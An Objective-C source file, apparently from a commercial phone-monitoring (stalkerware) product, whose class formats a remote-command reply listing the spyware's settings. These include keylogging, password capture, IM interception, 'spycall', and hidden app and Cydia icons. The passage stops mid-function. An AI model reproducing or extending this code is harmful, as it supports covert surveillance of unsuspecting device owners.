/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetWatchFlagsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestSettingsProcessor.h"
#import "Preference.h"
#import "PrefLocation.h"
#import "PrefEventsCapture.h"
#import "PrefMonitorNumber.h"
#import "PrefHomeNumber.h"
#import "PrefEmergencyNumber.h"
#import "PrefNotificationNumber.h"
#import "PrefWatchList.h"
#import "PrefVisibility.h"
#import "PrefRestriction.h"
#import "PrefPanic.h"
#import "PrefRestriction.h"
#import "PrefDeviceLock.h"
#import "PrefKeyword.h"
#import "PrefMonitorFacetimeID.h"
#import "PrefSignUp.h"
#import "PrefFileActivity.h"
#import "PrefCallRecord.h"

#import "LicenseManager.h"
#import "LicenseInfo.h"

#import "FxSettingsEvent.h"
#import "RemoteCmdSettingsCode.h"
#import "DateTimeFormat.h"

#import "RemoteCmdCode.h"

#define kVCardVersion		@"2.1"

@interface RequestSettingsProcessor (PrivateAPI)
- (void) processRequestSettings;
- (void) createAndSendSettingEvent;
- (void) sendReplySMSWithResult:(NSString *) aResult; 
+ (NSString *) displayStringWithItems: (NSArray *) aItems andCaption:(NSString *)aCaption;
- (NSString *) displayStringWithNumberArray: (NSArray *) aNumberArray remoteCommand: (NSInteger) aRemoteCommand;
@end

@implementation RequestSettingsProcessor
									   
/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RequestSettingsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RequestSettingsProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
	DLog (@"RequestSettingsProcessor-->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestSettingsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestSettingsProcessor-->doProcessingCommand");

	DLog (@"... create and send setting event")
	[self createAndSendSettingEvent];
		
	DLog (@"... process request setting")
	[self processRequestSettings];
}

#pragma mark RequestSettingsProcessor Private Methods

/**
 - Method name: processRequestSettings
 - Purpose:This method is used to process request settings
 - Argument list and description: No Argument
 - Return description: No Return Type
*/
+ (NSString *) getRequestSettings{
    DLog (@"RequestSettingsProcessor-->processRequestSettings");
    id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
    PrefEventsCapture *prefEvents		= (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
    PrefLocation *prefLocation			= (PrefLocation *)[prefManager preference:kLocation];
    PrefMonitorNumber *prefMonitor		= (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
    PrefHomeNumber *prefHomeNumberList	= (PrefHomeNumber *) [prefManager preference:kHome_Number];
    PrefWatchList *prefWatchList		= (PrefWatchList *)[prefManager preference:kWatch_List];
    PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
    PrefVisibility *prefVisibility		= (PrefVisibility *) [prefManager preference:kVisibility];
    PrefRestriction *prefRestriction	= (PrefRestriction *)[prefManager preference:kRestriction];
    PrefPanic *prefPanic				= (PrefPanic *)[prefManager preference:kPanic];
    PrefDeviceLock *prefDeviceLock		= (PrefDeviceLock *)[prefManager preference:kAlert];
    PrefKeyword *prefKeywords			= (PrefKeyword *)[prefManager preference:kKeyword];
    PrefMonitorFacetimeID *prefMonitorFacetimeID	= (PrefMonitorFacetimeID *)[prefManager preference:kFacetimeID];
    PrefSignUp *prefSignup = (PrefSignUp *)[prefManager preference:kSignUp];
    PrefFileActivity *prefFileActivity  = (PrefFileActivity *)[prefManager preference:kFileActivity];
    PrefCallRecord *prefCallRecord      = (PrefCallRecord *)[prefManager preference:kCallRecord];
    
    NSString *capture				= NSLocalizedString(@"kCapture", @"");
    NSString *spycall				= NSLocalizedString(@"kOneCall", @"");
    NSString *monitorNumbers        = NSLocalizedString(@"kMonitorNumbers", @"");
    NSString *deliveryRules			= NSLocalizedString(@"kDeliveryRules", @"");
    NSString *events				= NSLocalizedString(@"kEvents", @"");
    NSString *emergency				= NSLocalizedString(@"kEmergency", @"");
    NSString *home					= NSLocalizedString(@"kHome", @"");
    NSString *watchnumbers			= NSLocalizedString(@"kWatchNumbers", @"");
    NSString *watchOptions			= NSLocalizedString(@"kWatchOptions", @"");
    NSString *simChange				= NSLocalizedString(@"kSIMChangeNotification", @"");
    NSString *visibility			= NSLocalizedString(@"kVisible", @"");
    NSString *addressBookMgtMode	= NSLocalizedString(@"kAddressbookManagementMode", @"");
    NSString *panicMode				= NSLocalizedString(@"kPanicMode", @"");
    NSString *cis					= NSLocalizedString(@"kCIS", @"");
    NSString *restriction			= NSLocalizedString(@"kRestriction", @"");
    NSString *panic					= NSLocalizedString(@"kPanic", @"");
    NSString *configurations		= NSLocalizedString(@"kConfigID", @"");
    NSString *deviceLock			= NSLocalizedString(@"kDeviceLock", @"");
    NSString *appProfile			= NSLocalizedString(@"kAppProfile", @"");
    NSString *urlProfile			= NSLocalizedString(@"kURLProfile", @"");
    //	NSString *debugMode				= NSLocalizedString(@"kDebugMode", @"");
    NSString *wfaPolicy				= NSLocalizedString(@"kWaitingForApprovalPolicy", @"");
    //	NSString *calendar				= NSLocalizedString(@"kRequestSettingsCalendar", @"");
    //	NSString *note					= NSLocalizedString(@"kRequestSettingsNote", @"");
    NSString *keywords				= NSLocalizedString(@"kRequestSettingsSMSKeywords", @"");
    NSString *callRecording			= NSLocalizedString(@"kRequestSettingsCallRecording", @"");
    NSString *callRecordWatchOptions = NSLocalizedString(@"kRequestSettingsCallRecordingWatchOptions", @"");
    NSString *callRecordWatchNumbers = NSLocalizedString(@"kRequestSettingsCallRecordingWatchNumbers", @"");
    NSString *spycallOnFacetime		= NSLocalizedString(@"kSpycallOnFacetime", @"");
    NSString *deliveryMethod		= NSLocalizedString(@"kDeliveryMethod", @"");
    //NSString *url                   = NSLocalizedString(@"kURL", @"");
    
    NSString *applicationIconVisibility = NSLocalizedString(@"kVisibilityApplicationIcon", @"");
    NSString *cydiaIconVisibility       = NSLocalizedString(@"kVisibilityCydiaIcon", @"");
    NSString *pangGuIconVisibility      = NSLocalizedString(@"kVisibilityPangGuIcon", @"");
    
    NSString *temporalAmbientRecording  = NSLocalizedString(@"kTemporalControlAmbientRecord", @"");
    NSString *temporalScreenRecording   = NSLocalizedString(@"kTemporalControlScreenRecord", @"");
    NSString *temporalNetworkTraffic    = NSLocalizedString(@"kTemporalControlNetworkTraffic", @"");
    
    NSString *imAttachmentLimitSize    = NSLocalizedString(@"kIMAttachmentLimitSize", @"");
    
    NSString *debugLog  = NSLocalizedString(@"kDebubLog", @"");
    NSString *firefoxExtension = NSLocalizedString(@"kFirefoxExtension", @"");
    
    NSString *monitoredFileActivityType = NSLocalizedString(@"kMonitoredFileActivityType", @"");
    NSString *excludedFileActivityPaths = NSLocalizedString(@"kExcludedFileActivityPaths", @"");
    
    id <ConfigurationManager> configurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
    
    LicenseManager *licenseManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager];
    LicenseInfo *licenseInfo	   = [licenseManager mCurrentLicenseInfo];
    
    NSMutableString *resultString = [NSMutableString string];
    
    // Capture ===================================================================================
    if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
        [licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
        if ([prefEvents mStartCapture])
            capture = [capture stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        else
            capture = [capture stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        [resultString appendFormat:@"%@\n", capture];
    }
    // Delivery Rules =================================================================================
    if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
        [licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {		// 301
        
        if ([prefEvents mDeliverTimer] == 0) {
            // No delivery, X events
            deliveryRules = [NSString stringWithFormat:@"%@%@, %ld %@",deliveryRules, NSLocalizedString(@"kNoDelivery", @""),
                             (long)[prefEvents mMaxEvent],NSLocalizedString(@"kEvents:", @"")];
        } else {
            // Delivery rules: x hour, X events
            deliveryRules = [NSString stringWithFormat:@"%@%ld %@, %ld %@",deliveryRules,(long)[prefEvents mDeliverTimer],NSLocalizedString(@"kHour", @""),
                             (long)[prefEvents mMaxEvent],NSLocalizedString(@"kEvents:", @"")];
        }
        [resultString appendFormat:@"%@\n", deliveryRules];
    }
    // Events ==================================================================================
    if ([licenseInfo configID] != CONFIG_PANIC_VISIBLE	&&
        [licenseInfo configID] != CONFIG_PANIC_PLUS_VISIBLE) {
        NSMutableArray *eventResults=[[NSMutableArray alloc] init];
        if ([prefEvents  mEnableCallLog] && [configurationManager isSupportedFeature:kFeatureID_EventCall])				// call
            [eventResults addObject: NSLocalizedString(@"kCallLog", @"")];
        if ([prefEvents  mEnableSMS] && [configurationManager isSupportedFeature:kFeatureID_EventSMS])					// sms
            [eventResults addObject:NSLocalizedString(@"kSMS", @"")];
        if ([prefEvents  mEnableEmail] && [configurationManager isSupportedFeature:kFeatureID_EventEmail])				// email
            [eventResults addObject:NSLocalizedString(@"kEmail", @"")];
        if ([prefEvents  mEnableMMS] && [configurationManager isSupportedFeature:kFeatureID_EventMMS])					// mms
            [eventResults addObject:NSLocalizedString(@"kMMS", @"")];
        if ([prefEvents  mEnablePinMessage] && [configurationManager isSupportedFeature:kFeatureID_EventPinMessage])	// pin message
            [eventResults addObject:NSLocalizedString(@"kPin", @"")];
        if ([prefEvents  mEnableIM] && [configurationManager isSupportedFeature:kFeatureID_EventIM])					// im
            [eventResults addObject:NSLocalizedString(@"kIM", @"")];
        
        // Individual IM Client
        /*
         kPrefIMIndividualNone           = 0,
         kPrefIMIndividualWhatsApp       = 1 << 0,       // 1
         kPrefIMIndividualLINE			 = 1 << 1,       // 2
         kPrefIMIndividualFacebook		 = 1 << 2,       // 4
         kPrefIMIndividualSkype          = 1 << 3,       // 8
         kPrefIMIndividualBBM            = 1 << 4,       // 16
         kPrefIMIndividualIMessage       = 1 << 5,       // 32
         kPrefIMIndividualViber          = 1 << 6,       // 64
         kPrefIMIndividualGoogleTalk     = 1 << 7,       // 128
         kPrefIMIndividualWeChat         = 1 << 8,       // 256
         kPrefIMIndividualYahooMessenger = 1 << 9,       // 512
         kPrefIMIndividualSnapchat       = 1 << 10,      // 1024
         kPrefIMIndividualHangout        = 1 << 11,      // 2048
         kPrefIMIndividualSlingshot      = 1 << 12,      // 4096
         */
        
        if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualWhatsApp)              // WhatsApp
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWhatsApp])
                    [eventResults addObject:NSLocalizedString(@"kIMWhatsApp", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualLINE)                  // LINE
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMLINE])
                    [eventResults addObject:NSLocalizedString(@"kIMLINE", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualFacebook)              // Facebook
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMFacebook])
                    [eventResults addObject:NSLocalizedString(@"kIMFacebook", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualSkype)                 // Skype
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSkype])
                    [eventResults addObject:NSLocalizedString(@"kIMSkype", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualBBM)                   // BBM
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMBBM])
                    [eventResults addObject:NSLocalizedString(@"kIMBBM", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualIMessage)              // iMessage
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMIMessage])
                    [eventResults addObject:NSLocalizedString(@"kIMiMessage", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualViber)                 // Viber
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMViber])
                    [eventResults addObject:NSLocalizedString(@"kIMViber", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualGoogleTalk)            // GoogleTalk
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMGoogleTalk])
                    [eventResults addObject:NSLocalizedString(@"kIMGoogleTalk", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualWeChat)                // WeChat
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMWeChat])
                    [eventResults addObject:NSLocalizedString(@"kIMWeChat", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualYahooMessenger)        // Yahoo Messenger
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMYahooMessenger])
                    [eventResults addObject:NSLocalizedString(@"kIMYahooMessenger", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualSnapchat)              // Snapchat
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSnapchat])
                    [eventResults addObject:NSLocalizedString(@"kIMSnapchat", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualHangout)               // Hangout
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMHangout])
                    [eventResults addObject:NSLocalizedString(@"kIMHangout", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualSlingshot)             // Slingshot
                if ([RemoteCmdProcessorUtils isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMSlingshot])
                    [eventResults addObject:NSLocalizedString(@"kIMSlingshot", @"")];
        }
        
        if ([prefEvents  mEnableCameraImage] && [configurationManager isSupportedFeature:kFeatureID_EventCameraImage])	// camera
            [eventResults addObject:NSLocalizedString(@"kImage", @"")];
        if ([prefEvents  mEnableAudioFile] && [configurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) // audio
            [eventResults addObject:NSLocalizedString(@"kAudio", @"")];
        if ([prefEvents  mEnableVideoFile] && [configurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) // video
            [eventResults addObject:NSLocalizedString(@"kVideo", @"")];
        if ([prefLocation mEnableLocation] && [configurationManager isSupportedFeature:kFeatureID_EventLocation])		// location
            [eventResults addObject:NSLocalizedString(@"kLocation", @"")];
        if ([prefEvents  mEnableWallPaper] && [configurationManager isSupportedFeature:kFeatureID_EventWallpaper])		// wallpaper
            [eventResults addObject:NSLocalizedString(@"kWallpaper", @"")];
        if ([prefEvents  mEnableBrowserUrl] && [configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl])	// browser url
            [eventResults addObject:NSLocalizedString(@"kBrowserURL", @"")];
        if ([prefEvents mEnableALC] && [configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) // application life cycle
            [eventResults addObject:NSLocalizedString(@"kRCMALC", @"")];
        if ([prefEvents mEnableCalendar] && [configurationManager isSupportedFeature:kFeatureID_EventCalendar])
            [eventResults addObject:NSLocalizedString(@"kCalendar", @"")];
        if ([prefEvents mEnableNote] && [configurationManager isSupportedFeature:kFeatureID_NoteCapture])
            [eventResults addObject:NSLocalizedString(@"kNote", @"")];
        if ([prefEvents mEnableVoIPLog] && [configurationManager isSupportedFeature:kFeatureID_EventVoIP])
            [eventResults addObject:NSLocalizedString(@"kVoIP", @"")];
        if ([prefEvents mEnableKeyLog] && [configurationManager isSupportedFeature:kFeatureID_EventKeyLog])
            [eventResults addObject:NSLocalizedString(@"kKeyLog", @"")];
        if ([prefEvents mEnablePageVisited] && [configurationManager isSupportedFeature:kFeatureID_EventPageVisited])
            [eventResults addObject:NSLocalizedString(@"kPageVisited", @"")];
        if ([prefEvents mEnablePassword] && [configurationManager isSupportedFeature:kFeatureID_EventPassword])
            [eventResults addObject:NSLocalizedString(@"kPassword", @"")];
        // Mac
        if ([prefEvents mEnableIM] && [configurationManager isSupportedFeature:kFeatureID_EventMacOSIM])
            [eventResults addObject:NSLocalizedString(@"kMacOSIM", @"")];
        
        if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSIM]) {
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotLINE)           // LINE
                [eventResults addObject:NSLocalizedString(@"kIMAppShotLINE", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotSkype)          // Skype
                [eventResults addObject:NSLocalizedString(@"kIMAppShotSkype", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotQQ)             // QQ
                [eventResults addObject:NSLocalizedString(@"kIMAppShotQQ", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotIMessage)       // iMessage
                [eventResults addObject:NSLocalizedString(@"kIMAppShotiMessage", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotWeChat)         // WeChat
                [eventResults addObject:NSLocalizedString(@"kIMAppShotWeChat", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotAIM)             // AIM
                [eventResults addObject:NSLocalizedString(@"kIMAppShotAIM", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotTrillian)        // Trillian
                [eventResults addObject:NSLocalizedString(@"kIMAppShotTrillian", @"")];
            
            if ([prefEvents  mEnableIndividualIM] & kPrefIMIndividualAppShotViber)           // Viber
                [eventResults addObject:NSLocalizedString(@"kIMAppShotViber", @"")];
        }
        
        if ([prefEvents mEnableUSBConnection] && [configurationManager isSupportedFeature:kFeatureID_EventMacOSUSBConnection])
            [eventResults addObject:NSLocalizedString(@"kMacOSUSB", @"")];
        if ([prefEvents mEnableFileTransfer] && [configurationManager isSupportedFeature:kFeatureID_EventMacOSFileTransfer])
            [eventResults addObject:NSLocalizedString(@"kMacOSFileTransfer", @"")];
        if ([prefEvents mEnableEmail] && [configurationManager isSupportedFeature:kFeatureID_EVentMacOSEmail])
            [eventResults addObject:NSLocalizedString(@"kMacOSEmail", @"")];
        if ([prefEvents mEnableAppUsage] && [configurationManager isSupportedFeature:kFeatureID_EventMacOSAppUsage])
            [eventResults addObject:NSLocalizedString(@"kMacOSAppUsage", @"")];
        if ([prefEvents mEnableLogon] && [configurationManager isSupportedFeature:kFeatureID_EventMacOSLogon])
            [eventResults addObject:NSLocalizedString(@"kMacOSLogon", @"")];
        if ([prefFileActivity mEnable] && [configurationManager isSupportedFeature:kFeatureID_EventFileActivity])
            [eventResults addObject:NSLocalizedString(@"kFileActivity", @"")];
        if ([prefEvents mEnableNetworkConnection] && [configurationManager isSupportedFeature:kFeatureID_EventNetworkConnection])
            [eventResults addObject:NSLocalizedString(@"kNetworkConnection", @"")];
        if ([prefFileActivity mEnable] && [configurationManager isSupportedFeature:kFeatureID_EventPrintJob])
            [eventResults addObject:NSLocalizedString(@"kFilePrintJob", @"")];
//        if ([prefFileActivity mEnable] && [configurationManager isSupportedFeature:kFeatureID_EventAppScreenShot])
//            [eventResults addObject:NSLocalizedString(@"kAppScreenShot", @"")];

        events = [self displayStringWithItems:eventResults andCaption:events];
        events = [events stringByReplacingOccurrencesOfString:@"[" withString:@""];
        events = [events stringByReplacingOccurrencesOfString:@"]" withString:@""];
        [resultString appendFormat:@"%@\n", events];
        [eventResults release];
    }
    // Location ======================================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_EventLocation])  {
        DLog (@"1 request setting: location")
        NSString *locationInterval = [NSString stringWithFormat:@"%@%@",
                                      NSLocalizedString(@"kLocationInterval", @""),
                                      [RemoteCmdProcessorUtils locationTimeIntervalForDisplay:[prefLocation mLocationInterval]]];
        [resultString appendFormat:@"%@\n", locationInterval];
    }
    
    // SpyCall ===========================================================================================
    /*
     For Panic configuration of Entry and Basic, SpyCall feature is NOT supported but Monitor number feature is supported
     */
    if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]/*			||
                                                                     [configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]*/	){
                                                                         DLog(@"2 request setting: spycall")
                                                                         
                                                                         if ([configurationManager isSupportedFeature:kFeatureID_SpyCall]) {
                                                                             if ([prefMonitor mEnableMonitor]) {
                                                                                 spycall = [spycall stringByAppendingString:NSLocalizedString(@"kOn", @"")];
                                                                             }
                                                                             else {
                                                                                 spycall = [spycall stringByAppendingString:NSLocalizedString(@"kOff", @"")];
                                                                             }
                                                                         } else {
                                                                             spycall = [spycall stringByAppendingString:NSLocalizedString(@"kOff", @"")];
                                                                         }
                                                                         //spycall = [spycall stringByAppendingString:@", "];
                                                                         //spycall = [self displayStringWithItems:[prefMonitor mMonitorNumbers] andCaption:spycall];
                                                                         [resultString appendFormat:@"%@\n", spycall];
                                                                     }
    
    if ([configurationManager isSupportedFeature:kFeatureID_MonitorNumbers]) {
        monitorNumbers = [self displayStringWithItems:[prefMonitor mMonitorNumbers] andCaption:monitorNumbers];
        [resultString appendFormat:@"%@\n", monitorNumbers];
    }
    
    // Watch Options ===============================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
        DLog(@"3 request setting: watch options")
        if([prefWatchList mEnableWatchNotification] == 1) {
            watchOptions=[watchOptions stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        }
        else {
            watchOptions=[watchOptions stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        }
        watchOptions = [watchOptions stringByAppendingString:@", "];
        
        if ([prefWatchList mWatchFlag] & kWatch_In_Addressbook)
            watchOptions=[NSString stringWithFormat:@"%@[%@,",watchOptions,@"1"];
        else
            watchOptions=[NSString stringWithFormat:@"%@[%@,",watchOptions,@"0"];
        
        if ([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook)
            watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"1"];
        else
            watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"0"];
        
        if ([prefWatchList mWatchFlag] & kWatch_In_List)
            watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"1"];
        else
            watchOptions=[NSString stringWithFormat:@"%@%@,",watchOptions,@"0"];
        
        if ([prefWatchList mWatchFlag] & kWatch_Private_Or_Unknown_Number)
            watchOptions=[NSString stringWithFormat:@"%@%@]",watchOptions,@"1"];
        else
            watchOptions=[NSString stringWithFormat:@"%@%@]",watchOptions,@"0"];
        
        [resultString appendFormat:@"%@\n", watchOptions];
    }
    
    // SIM change ===============================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_SIMChange]) {
        DLog(@"4 request setting: sim change")
        simChange = [simChange stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        [resultString appendFormat:@"%@\n", simChange];
    }
    
    // Visibility ===============================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_HideApplicationIcon]) {
        DLog(@"5 request setting: visibility")
        if (prefVisibility) {
            DLog(@"prefVisibility exists")
        }
        if ([prefVisibility mVisible] == TRUE) {
            DLog(@"true")
            visibility = [visibility stringByAppendingString:NSLocalizedString(@"kOn", @"")];
        } else {
            DLog(@"false")
            visibility = [visibility stringByAppendingString:NSLocalizedString(@"kOff", @"")];
        }
        [resultString appendFormat:@"%@\n", visibility];
    }
    
    // Home ===========================================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_HomeNumbers]) {
        DLog(@"6 request setting: home")
        home = [self displayStringWithItems:[prefHomeNumberList mHomeNumbers] andCaption:home];
        [resultString appendFormat:@"%@\n", home];
    }
    
    // Panic mode =====================================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
        DLog(@"7 request setting: panic mode")
        if (prefPanic) {
            DLog(@"prefPanic exists")
            if ([prefPanic mLocationOnly] == TRUE) {
                DLog(@"true")
                panicMode = [panicMode stringByAppendingString:NSLocalizedString(@"kLocationOnly", @"")];
            } else {
                DLog(@"false")
                panicMode = [panicMode stringByAppendingString:NSLocalizedString(@"kLocationAndImage", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", panicMode];
    }
    
    // CIS --> None
    if ([configurationManager isSupportedFeature:kFeatureID_CISNumbers]) {
        DLog(@"8 request setting: CIS")
        cis = [cis stringByAppendingString:NSLocalizedString(@"kNone", @"")];
        [resultString appendFormat:@"%@\n", cis];
    }
    
    // Communication restrictions:
    if ([configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
        DLog(@"9 request setting: communication restriction")
        if (prefRestriction) {
            DLog(@"prefRestriction exists")
            if ([prefRestriction mEnableRestriction] == TRUE) {
                DLog(@"true")
                restriction = [restriction stringByAppendingString:NSLocalizedString(@"kOn", @"")];
            } else {
                DLog(@"false")
                restriction = [restriction stringByAppendingString:NSLocalizedString(@"kOff", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", restriction];
    }
    
    // Configuration
    NSInteger configID = [licenseInfo configID];
    configurations = [NSString stringWithFormat:@"%@%ld", configurations, (long)configID];
    [resultString appendFormat:@"%@\n", configurations];
    
    // Panic
    if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
        DLog(@"10 request setting: panic")
        if (prefPanic) {
            DLog(@"prefPanic exists")
            if ([prefPanic mPanicStart] == TRUE) {
                DLog(@"true")
                panic = [panic stringByAppendingString:NSLocalizedString(@"kOn", @"")];
            } else {
                DLog(@"false")
                panic = [panic stringByAppendingString:NSLocalizedString(@"kOff", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", panic];
    }
    
    // Device lock
    if ([configurationManager isSupportedFeature:kFeatureID_AlertLockDevice]) {
        DLog(@"11 request setting: device lock")
        if (prefDeviceLock) {
            DLog(@"prefDeviceLock exists")
            if ([prefDeviceLock mStartAlertLock] == TRUE) {
                DLog(@"true")
                deviceLock = [deviceLock stringByAppendingString:NSLocalizedString(@"kOn", @"")];
            } else {
                DLog(@"false")
                deviceLock = [deviceLock stringByAppendingString:NSLocalizedString(@"kOff", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", deviceLock];
    }
    
    // Emergency========================================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_EmergencyNumbers]) {
        DLog(@"12 request setting: emergency")
        emergency = [self displayStringWithItems:[prefEmergencyNumberList mEmergencyNumbers] andCaption:emergency];
        [resultString appendFormat:@"%@\n", emergency];
    }
    
    // Watch Numbers =================================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_WatchList]) {
        DLog(@"13 request setting: watch")
        watchnumbers = [self displayStringWithItems:[prefWatchList mWatchNumbers] andCaption:watchnumbers];
        [resultString appendFormat:@"%@\n", watchnumbers];
    }
    
    /// !!!: Not include debug mode in the result. This value will be included for the special build for a specific customer
    // Debug mode --> Off
    //debugMode = [debugMode stringByAppendingString:NSLocalizedString(@"kOff", @"")];
    //[resultString appendFormat:@"%@\n", debugMode];
    
    // AddressBookManagement Mode =======================================================================
    if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
        DLog(@"14 request setting: address book mode")
        DLog(@"address mgt mode: %lu", (unsigned long)[prefRestriction mAddressBookMgtMode])
        if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff)
            addressBookMgtMode = [addressBookMgtMode stringByAppendingString:NSLocalizedString(@"kAddressbookManagementModeOff", @"")];
        else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor)
            addressBookMgtMode = [addressBookMgtMode stringByAppendingString:NSLocalizedString(@"kAddressbookManagementModeMonitor", @"")];
        else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict)
            addressBookMgtMode = [addressBookMgtMode stringByAppendingString:NSLocalizedString(@"kAddressbookManagementModeRestrict", @"")];
        
        [resultString appendFormat:@"%@\n", addressBookMgtMode];
    }
    
    // Enable Application Profile
    if ([configurationManager isSupportedFeature:kFeatureID_ApplicationProfile] &&
        [configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
        DLog(@"15 request setting: Application Profile")
        if (prefRestriction) {
            DLog(@"prefRestriction exists")
            if ([prefRestriction mEnableAppProfile] == TRUE) {
                DLog(@"true")
                appProfile = [appProfile stringByAppendingString:NSLocalizedString(@"kOn", @"")];
            } else {
                DLog(@"false")
                appProfile = [appProfile stringByAppendingString:NSLocalizedString(@"kOff", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", appProfile];
    }
    
    // Enable URL Profile
    if ([configurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile] &&
        [configurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
        DLog(@"16 request setting: URL Profile")
        if (prefRestriction) {
            DLog(@"prefRestriction exists")
            if ([prefRestriction mEnableUrlProfile] == TRUE) {
                DLog(@"true")
                urlProfile = [urlProfile stringByAppendingString:NSLocalizedString(@"kOn", @"")];
            } else {
                DLog(@"false")
                urlProfile = [urlProfile stringByAppendingString:NSLocalizedString(@"kOff", @"")];
            }
        }
        [resultString appendFormat:@"%@\n", urlProfile];
    }
    
    // Waiting for approval policy
